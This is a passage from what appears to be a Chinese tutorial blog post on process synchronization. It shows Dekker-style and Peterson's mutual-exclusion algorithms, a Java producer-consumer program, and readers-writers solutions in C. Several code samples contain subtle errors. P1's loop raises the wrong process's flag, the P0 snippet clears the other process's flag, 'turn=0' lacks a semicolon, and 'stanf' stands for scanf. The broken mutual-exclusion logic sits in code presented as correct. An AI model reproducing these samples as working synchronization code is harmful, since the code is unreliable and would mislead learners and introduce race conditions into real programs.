&#x2F;&#x2F; 看看P1是否也举手了  &#123;    if(turn&#x3D;&#x3D;1) &#x2F;&#x2F; 如果P1也举手了，那么就看看到底轮到谁    &#123;      flag[0]&#x3D;false;&#x2F;&#x2F; 如果确实轮到P1，那么P0先把手放下（让P1先）      while(turn&#x3D;&#x3D;1);&#x2F;&#x2F; 只要还是P1的时间，P0就不举手，一直等      flag[0]&#x3D;true;&#x2F;&#x2F; 等到P1用完了（轮到P0了），P0再举手    &#125;    flag[1] &#x3D; false; &#x2F;&#x2F; 只要可以跳出循环，说明P1用完了，应该跳出最外圈的while  &#125;  visit();&#x2F;&#x2F; 访问临界区  turn &#x3D; 1;&#x2F;&#x2F; P0访问完了，把轮次交给P1，让P1可以访问  flag[0]&#x3D;false;&#x2F;&#x2F; P0放下手&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="P1的逻辑"><a href="#P1的逻辑" class="headerlink" title="P1的逻辑"></a>P1的逻辑</h4><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">do&#123;  flag[1] &#x3D; true;&#x2F;&#x2F; 先P1举手示意我要访问  while(flag[0])  &#x2F;&#x2F; 如果P0是否也举手了  &#123;    if(turn&#x3D;&#x3D;0) &#x2F;&#x2F; 如果P0也举手了，那么久看看到底轮到谁    &#123;      flag[1]&#x3D;false;&#x2F;&#x2F; 如果确实轮到P0，那么P1先把手放下（让P0先）      while(turn&#x3D;&#x3D;0);&#x2F;&#x2F; 只要还是P0的时间，P1就不举手，一直等      flag[0]&#x3D;true;&#x2F;&#x2F; 等到P0用完了（轮到P1了），P1再举手    &#125;  &#125;  visit();&#x2F;&#x2F; 访问临界区  turn &#x3D; 0;&#x2F;&#x2F; P1访问完了，把轮次交给P0，让P0可以访问  flag[1]&#x3D;false;&#x2F;&#x2F; P1放下手&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="实现方法："><a href="#实现方法：" class="headerlink" title="实现方法："></a>实现方法：</h4><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include&lt;iostream&gt;using namespace std;bool flag[2];int turn;void procedure0()&#123;    while(true)    &#123;        flag[0]&#x3D;true;        while(flag[1]&#x3D;&#x3D;true)        &#123;            if(turn&#x3D;&#x3D;1)            &#123;                flag[0]&#x3D;false;                while(turn&#x3D;&#x3D;1)                &#123;                    &#x2F;*do nothing*&#x2F;                &#125;                flag[0]&#x3D;true;            &#125;        &#125;        &#x2F;*critical section*&#x2F; ;        turn&#x3D;1;        flag[0]&#x3D;false;        &#x2F;*remainder section*&#x2F;    &#125;&#125;void procedure1()&#123;    while(true)    &#123;        flag[1]&#x3D;true;        while(flag[0]&#x3D;&#x3D;true)        &#123;            if(turn&#x3D;&#x3D;0)            &#123;                flag[1]&#x3D;false;                while(turn&#x3D;&#x3D;0)                &#123;                    &#x2F;*do nothing*&#x2F;                &#125;                flag[1]&#x3D;true;            &#125;        &#125;        &#x2F;*critical section*&#x2F; ;        turn&#x3D;0             flag[1]&#x3D;false;        &#x2F;*remainder section*&#x2F;    &#125;&#125;int main()&#123;    flag[0]&#x3D;flag[1]&#x3D;0;    turn&#x3D;1;    &#x2F;&#x2F;先让P1运行    &#x2F;*start procedure0 and procedure1*&#x2F; ;    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="二、Peterson算法"><a href="#二、Peterson算法" class="headerlink" title="二、Peterson算法"></a>二、Peterson算法</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">boolean flag[2];int turn;void procedure0()&#123;    while(true)    &#123;        flag[0]&#x3D;true;        turn&#x3D;1;        while(flag[1]&amp;&amp;turn&#x3D;&#x3D;1) &#x2F;*若flag[1]为false，P0就进入临界区；若flag[1]为tureP0循环等待，只要P1退出临界区，P0即可进入*&#x2F;        &#123;            &#x2F;* donothing*&#x2F;        &#125;        visit();&#x2F;*访问临界区*&#x2F;        flag[0]&#x3D;false;&#x2F;*访问临界区完成，procedure0释放出临界区*&#x2F;        &#x2F;*remainder section*&#x2F;    &#125;&#125;void procedure1()&#123;    while(true)    &#123;        flag[1]&#x3D;true;        turn&#x3D;0;        while(flag[0]&amp;&amp;turn&#x3D;&#x3D;0)        &#123;            &#x2F;* donothing*&#x2F; ;        &#125;        visit();&#x2F;*访问临界区*&#x2F;        flag[1]&#x3D;false;&#x2F;*访问临界区完成，procedure1释放出临界区*&#x2F;        &#x2F;*remainder section*&#x2F;    &#125;&#125;void main()&#123;    flag[0]&#x3D;flag[1]&#x3D;false;    &#x2F;*start procedure0 and procedure1*&#x2F; ;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>进程P0，一旦它设置flag[0]=true，则P1不能进入<a href="https://baike.baidu.com/item/%E4%B8%B4%E7%95%8C%E5%8C%BA/8942134">临界区</a>。如果P1已经进入临界区，那么flag[1]=true，P0被阻塞不能进入临界区。</p><p>另一方面，互相阻塞也避免了。假设P0在<a href="https://baike.baidu.com/item/while/755564">while</a>里被阻塞了，表示flag[1]为true且turn=1，则此时P1可以执行。</p><h3 id="三、生产者和消费者问题"><a href="#三、生产者和消费者问题" class="headerlink" title="三、生产者和消费者问题"></a>三、生产者和消费者问题</h3><p>考虑有一些生产者和消费者进程，生产者进程生产信息并把它们放入缓冲池中，消费者从缓冲池中取走信息。生产者—消费者问题是相互合作的进程关系的一种抽象，如在输入时，输入进程是生产者，计算进程是消费者；而在输出时，则计算进程是生产者，打印进程是消费者。请使用信号量机制来解决生产者—消费者问题。</p><p>归结生产者和消费者之间的关系：</p><p>（1） 诸进程之间互斥访问缓冲池</p><p>（2） 缓冲池满时，生产者等待</p><p>（3） 缓冲池空时，消费者等待</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>loan<span class="token punctuation">.</span>entity</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Store</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">int</span> MAX_SIZE<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token comment">//仓库总共可存放货物</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> count<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">//当前仓库货物</span>    <span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>count<span class="token operator">>=</span>MAX_SIZE<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"仓库已满"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"等待中。。。。"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        count<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"存入仓库，当前货物数："</span><span class="token operator">+</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">notify</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token keyword">void</span> <span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>count<span class="token operator">&lt;=</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"仓库空了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"等待中。。。。"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        count<span class="token operator">--</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"取出货物，当前货物数："</span><span class="token operator">+</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">notify</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token class-name">Store</span> s<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Store</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Thread</span> producer1<span class="token operator">=</span>s<span class="token punctuation">.</span><span class="token keyword">new</span> <span class="token class-name">Producer</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//成员内部类需通过对象访问</span>        <span class="token class-name">Thread</span> producer2<span class="token operator">=</span>s<span class="token punctuation">.</span><span class="token keyword">new</span> <span class="token class-name">Producer</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Thread</span> consumer1<span class="token operator">=</span>s<span class="token punctuation">.</span><span class="token keyword">new</span> <span class="token class-name">Consumer</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Thread</span> consumer2<span class="token operator">=</span>s<span class="token punctuation">.</span><span class="token keyword">new</span> <span class="token class-name">Consumer</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        producer1<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"producer1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//利用Thread中的方法</span>        producer2<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"producer2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        consumer1<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"consumer1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        consumer2<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"consumer2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        producer1<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        producer2<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        consumer1<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        consumer2<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name">Producer</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token class-name">Store</span> store<span class="token punctuation">;</span>        <span class="token class-name">Producer</span><span class="token punctuation">(</span><span class="token class-name">Store</span> s<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            store<span class="token operator">=</span>s<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">try</span>                <span class="token punctuation">&#123;</span>                    store<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    <span class="token comment">// TODO Auto-generated catch block</span>                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name">Consumer</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token class-name">Store</span> store<span class="token punctuation">;</span>        <span class="token class-name">Consumer</span><span class="token punctuation">(</span><span class="token class-name">Store</span> s<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            store<span class="token operator">=</span>s<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">try</span>                <span class="token punctuation">&#123;</span>                    store<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">15000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    <span class="token comment">// TODO Auto-generated catch block</span>                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="四、读者和写者算法"><a href="#四、读者和写者算法" class="headerlink" title="四、读者和写者算法"></a>四、读者和写者算法</h3><p>C程序：</p><p>代码中信号量解析：</p><p>设置五个信号量，分别是RWMutex, mutex1, mutex2, mutex3, wrt，两个全局整型变量writeCount, readCount</p><p>信号量mutex1在写者的进入区和退出区中使用，使得每次只有一个写者对其相应进入区或推出区进行操作，主要原因是进入区和退出区存在对变量writeCount的修改，每个写者其进入区中writeCount加1，退出区中writeCount减1。信号量RWMutex则是读者和写者两个之间的互斥信号量，保证每次只读或者只写。写者优先中，写者的操作应该优先于读者，则信号量一直被占用着，直到没有写者的时候才会释放，即当writeCount等于1的时候，申请信号量RWMutex，其余的写者无需再次申请，但是写者是不能同时进行写操作的，则需要设置一个信号量wrt来保证每次只有一个写者进行写操作，当写者的数量writeCount等于0的时候，则证明此时没有没有读者了，释放信号量RWMutex。信号量mutex2防止一次多个读者修改readCount。当readCount为1的时候，为阻止写者进行写操作，申请信号量wrt，则写者就无法进行写操作了。信号量mutex3的主要用处就是避免写者同时与多个读者进行竞争，读者中信号量RWMutex比mutex3先释放，则一旦有写者，写者可马上获得资源。</p><h4 id="4-1-写者优先"><a href="#4-1-写者优先" class="headerlink" title="4.1 写者优先"></a>4.1 写者优先</h4><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++"># include &lt;stdio.h&gt;# include &lt;stdlib.h&gt;# include &lt;time.h&gt;# include &lt;sys&#x2F;types.h&gt;# include &lt;pthread.h&gt;# include &lt;semaphore.h&gt;# include &lt;string.h&gt;# include &lt;unistd.h&gt;&#x2F;&#x2F;semaphoressem_t RWMutex, mutex1, mutex2, mutex3, wrt;int writeCount, readCount;struct data&#123;    int id;    int opTime;    int lastTime;&#125;;&#x2F;&#x2F;读者void* Reader(void* param)&#123;    int id &#x3D; ((struct data*)param)-&gt;id;    int lastTime &#x3D; ((struct data*)param)-&gt;lastTime;    int opTime &#x3D; ((struct data*)param)-&gt;opTime;    sleep(opTime);    printf(&quot;Thread %d: waiting to read\n&quot;, id);    sem_wait(&amp;mutex3);    sem_wait(&amp;RWMutex);    sem_wait(&amp;mutex2);    readCount++;    if(readCount &#x3D;&#x3D; 1)        sem_wait(&amp;wrt);    sem_post(&amp;mutex2);    sem_post(&amp;RWMutex);    sem_post(&amp;mutex3);    printf(&quot;Thread %d: start reading\n&quot;, id);    &#x2F;* reading is performed *&#x2F;    sleep(lastTime);    printf(&quot;Thread %d: end reading\n&quot;, id);    sem_wait(&amp;mutex2);    readCount--;    if(readCount &#x3D;&#x3D; 0)        sem_post(&amp;wrt);    sem_post(&amp;mutex2);    pthread_exit(0);&#125;&#x2F;&#x2F;写者void* Writer(void* param)&#123;    int id &#x3D; ((struct data*)param)-&gt;id;    int lastTime &#x3D; ((struct data*)param)-&gt;lastTime;    int opTime &#x3D; ((struct data*)param)-&gt;opTime;    sleep(opTime);    printf(&quot;Thread %d: waiting to write\n&quot;, id);    sem_wait(&amp;mutex1);    writeCount++;    if(writeCount &#x3D;&#x3D; 1)    &#123;        sem_wait(&amp;RWMutex);    &#125;    sem_post(&amp;mutex1);    sem_wait(&amp;wrt);    printf(&quot;Thread %d: start writing\n&quot;, id);    &#x2F;* writing is performed *&#x2F;    sleep(lastTime);    printf(&quot;Thread %d: end writing\n&quot;, id);    sem_post(&amp;wrt);    sem_wait(&amp;mutex1);    writeCount--;    if(writeCount &#x3D;&#x3D; 0)    &#123;        sem_post(&amp;RWMutex);    &#125;    sem_post(&amp;mutex1);    pthread_exit(0);&#125;int main()&#123;    &#x2F;&#x2F;pthread    pthread_t tid; &#x2F;&#x2F; the thread identifier    pthread_attr_t attr; &#x2F;&#x2F;set of thread attributes    &#x2F;* get the default attributes *&#x2F;    pthread_attr_init(&amp;attr);    &#x2F;&#x2F;initial the semaphores    sem_init(&amp;mutex1, 0, 1);    sem_init(&amp;mutex2, 0, 1);    sem_init(&amp;mutex3, 0, 1);    sem_init(&amp;wrt, 0, 1);    sem_init(&amp;RWMutex, 0, 1);    readCount &#x3D; writeCount &#x3D; 0;    int id &#x3D; 0;    while(scanf(&quot;%d&quot;, &amp;id) !&#x3D; EOF)    &#123;        char role;&#x2F;&#x2F;producer or consumer        int opTime;&#x2F;&#x2F;operating time        int lastTime;&#x2F;&#x2F;run time        stanf(&quot;%c%d%d&quot;, &amp;role, &amp;opTime, &amp;lastTime);        struct data* d &#x3D; (struct data*)malloc(sizeof(struct data));        d-&gt;id &#x3D; id;        d-&gt;opTime &#x3D; opTime;        d-&gt;lastTime &#x3D; lastTime;        if(role &#x3D;&#x3D; &#39;R&#39;)        &#123;            printf(&quot;Create the %d thread: Reader\n&quot;, id);            pthread_create(&amp;tid, &amp;attr, Reader, d);        &#125;        else if(role &#x3D;&#x3D; &#39;W&#39;)        &#123;            printf(&quot;Create the %d thread: Writer\n&quot;, id);            pthread_create(&amp;tid, &amp;attr, Writer, d);        &#125;    &#125;    sem_destroy(&amp;mutex1);    sem_destroy(&amp;mutex2);    sem_destroy(&amp;mutex3);    sem_destroy(&amp;RWMutex);    sem_destroy(&amp;wrt);    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-2-读者优先"><a href="#4-2-读者优先" class="headerlink" title="4.2 读者优先"></a>4.2 读者优先</h4><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;windows.h&gt;#include &lt;iostream&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;accctrl.h&gt;#include &lt;time.h&gt;unsigned int readcount &#x3D; 0;bool p_ccontinue &#x3D; true; &#x2F;&#x2F;控制程序结束HANDLE RSemaphore; &#x2F;&#x2F;改变readcount值时互斥HANDLE WSemaphore; &#x2F;&#x2F;写互斥DWORD WINAPI Writer(LPVOID); &#x2F;&#x2F;写者线程DWORD WINAPI Reader(LPVOID); &#x2F;&#x2F;读者线程int main()&#123;    RSemaphore &#x3D; CreateSemaphore(NULL,1,1,NULL);    WSemaphore &#x3D; CreateSemaphore(NULL,1,1,NULL);    const unsigned short Writer_COUNT &#x3D; 3;&#x2F;&#x2F;写者数量    const unsigned short Reader_COUNT &#x3D; 8;&#x2F;&#x2F;读者数量    const unsigned short THREADS_COUNT &#x3D; Writer_COUNT+Reader_COUNT;    HANDLE hThreads[THREADS_COUNT]; &#x2F;&#x2F;各线程的 handle    DWORD writerID[Writer_COUNT]; &#x2F;&#x2F;写者线程的标识符    DWORD readerID[Reader_COUNT]; &#x2F;&#x2F;读者线程的标识符    srand(time(0));    int writer_count &#x3D; 0;    int reader_count &#x3D; 0;    for(int i &#x3D; 0; i &lt; Writer_COUNT + Reader_COUNT; i++)    &#123;        int ran &#x3D; rand()%10;        if((ran &lt; 5) &amp;&amp; (writer_count &lt; Writer_COUNT))&#x2F;&#x2F;Writer        &#123;            hThreads[i]&#x3D;CreateThread(NULL,0,Writer,NULL,0,&amp;writerID[writer_count]);            if (hThreads[i]&#x3D;&#x3D;NULL) return -1;            writer_count++;        &#125;        else if((ran &gt;&#x3D; 5) &amp;&amp; (reader_count &lt; Reader_COUNT))&#x2F;&#x2F;Reader        &#123;            hThreads[i]&#x3D;CreateThread(NULL,0,Reader,NULL,0,&amp;readerID[reader_count]);            if (hThreads[i]&#x3D;&#x3D;NULL) return -1;            reader_count++;        &#125;        Sleep(500);&#x2F;&#x2F;等待500ms    &#125;    while(p_ccontinue)    &#123;        if(getchar())  &#x2F;&#x2F;按回车后终止程序运行        &#123;            p_ccontinue &#x3D; false;        &#125;    &#125;    return 0;&#125;&#x2F;&#x2F;写者DWORD WINAPI Writer(LPVOID lpPara)&#123;    while(p_ccontinue)    &#123;        printf(&quot;\n%d is waiting to write...\n&quot;,GetCurrentThreadId());        WaitForSingleObject(WSemaphore,INFINITE);&#x2F;&#x2F;P(w)在读或在写时，写者阻塞        printf(&quot;\n**  writer %d got the control\n&quot;,GetCurrentThreadId());        &#x2F;&#x2F;write...        printf(&quot;\n%d is writing...\n&quot;,GetCurrentThreadId());        Sleep(1500);        printf(&quot;\n--- %d have finished the writing\n&quot;,GetCurrentThreadId());        ReleaseSemaphore(WSemaphore,1,NULL);&#x2F;&#x2F;V(w)写完，唤醒阻塞的读者或写者        return 0;&#x2F;&#x2F;结束此线程    &#125;    return 0;&#125;&#x2F;&#x2F;读者DWORD WINAPI Reader(LPVOID lpPara)&#123;    while(p_ccontinue)    &#123;        printf(&quot;\n%d is waiting to read...\n&quot;,GetCurrentThreadId());        WaitForSingleObject(RSemaphore,INFINITE);&#x2F;&#x2F;P(x)临界区互斥，所有读者修改readcount        readcount++;        if(readcount &#x3D;&#x3D; 1)&#x2F;&#x2F;第一个读，要等已经在写的写者写完才可以开始读            WaitForSingleObject(WSemaphore,INFINITE);&#x2F;&#x2F;P(w)有写时，读者阻塞        &#x2F;&#x2F;同时读，故要在Read()之前V(x)        ReleaseSemaphore(RSemaphore,1,NULL);&#x2F;&#x2F;V(x)        &#x2F;&#x2F;read...        printf(&quot;\n%d is reading...\n&quot;,GetCurrentThreadId());        Sleep(1500);        printf(&quot;\n--- %d have finished the reading\n&quot;,GetCurrentThreadId());        WaitForSingleObject(RSemaphore,INFINITE);&#x2F;&#x2F;P(x)        readcount--;        if(readcount&#x3D;&#x3D; 0)        &#123;            printf(&quot;\n----- All Readers done\n&quot;);            ReleaseSemaphore(WSemaphore,1,NULL);&#x2F;&#x2F;V(w)都不读，唤醒阻塞的写者        &#125;        ReleaseSemaphore(RSemaphore,1,NULL);&#x2F;&#x2F;V(x)        return 0;&#x2F;&#x2F;结束此线程    &#125;    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 